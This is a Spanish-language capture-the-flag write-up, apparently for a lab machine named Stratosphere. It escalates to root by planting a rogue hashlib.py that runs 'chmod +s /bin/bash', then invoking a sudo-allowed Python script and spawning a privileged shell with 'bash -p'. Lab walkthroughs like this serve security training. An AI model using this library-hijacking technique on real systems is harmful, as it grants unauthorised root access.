```bash
richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```
Por lo que enumere el archivo /home/richar/test.py para tratar de conseguir alguna forma de explotarlo.
```bash
richard@stratosphere:~$ cat /home/richard/test.py
#!/usr/bin/python3
import hashlib


def question():
    q1 = input("Solve: 5af003e100c80923ec04d65933d382cb\n")
    md5 = hashlib.md5()
    md5.update(q1.encode())
    if not md5.hexdigest() == "5af003e100c80923ec04d65933d382cb":
        print("Sorry, that's not right")
        return
    print("You got it!")
    q2 = input("Now what's this one? d24f6fb449855ff42344feff18ee2819033529ff\n")
    sha1 = hashlib.sha1()
    sha1.update(q2.encode())
    if not sha1.hexdigest() == 'd24f6fb449855ff42344feff18ee2819033529ff':
        print("Nope, that one didn't work...")
        return
    print("WOW, you're really good at this!")
    q3 = input("How about this? 91ae5fc9ecbca9d346225063f23d2bd9\n")
    md4 = hashlib.new('md4')
    md4.update(q3.encode())
    if not md4.hexdigest() == '91ae5fc9ecbca9d346225063f23d2bd9':
        print("Yeah, I don't think that's right.")
        return
    print("OK, OK! I get it. You know how to crack hashes...")
    q4 = input("Last one, I promise: 9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943\n")
    blake = hashlib.new('BLAKE2b512')
    blake.update(q4.encode())
    if not blake.hexdigest() == '9efebee84ba0c5e030147cfd1660f5f2850883615d444ceecf50896aae083ead798d13584f52df0179df0200a3e1a122aa738beff263b49d2443738eba41c943':
        print("You were so close! urg... sorry rules are rules.")
        return

    import os
    os.system('/root/success.py')
    return

question()
richard@stratosphere:~$ ls -la /home/richard/test.py
-rwxr-x--- 1 root richard 1507 Mar 19  2018 /home/richard/test.py
```
Al tener toda esta informacion intente ver si tenia permisos de escritura en la libreria hashlib sin encontrar nada. Por lo que lo siguiente que hice fue tratar de realizar un Library PathHijacking.
Enumere las rutas y al parecer primero buscaba por la ruta actual en donde se ejecuta y luego buscaba en otras designadas por el sistema.
```bash
richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
```
Entonces intente crear un archivo llamado hashlib.py en la ruta actual que me ejecutara un chmod +s /bin/bash para obtener permisos suid en la bash.
```bash
richard@stratosphere:~$ nano hashlib.py
richard@stratosphere:~$ cat hashlib.py 
import os
os.system('chmod +s /bin/bash')
richard@stratosphere:~$ sudo -u root /usr/bin/python /home/richard/test.py
Solve: 5af003e100c80923ec04d65933d382cb
as
Traceback (most recent call last):
  File "/home/richard/test.py", line 38, in <module>
    question()
  File "/home/richard/test.py", line 7, in question
    md5 = hashlib.md5()
AttributeError: module 'hashlib' has no attribute 'md5'
richard@stratosphere:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1099016 May 15  2017 /bin/bash
richard@stratosphere:~$
```
Con el permiso s en la bash podemos convertirnos en root.
```bash
richard@stratosphere:~$ bash -p
bash-4.4# whoami
root
```
Hemos logrado pwnear la maquina!!!


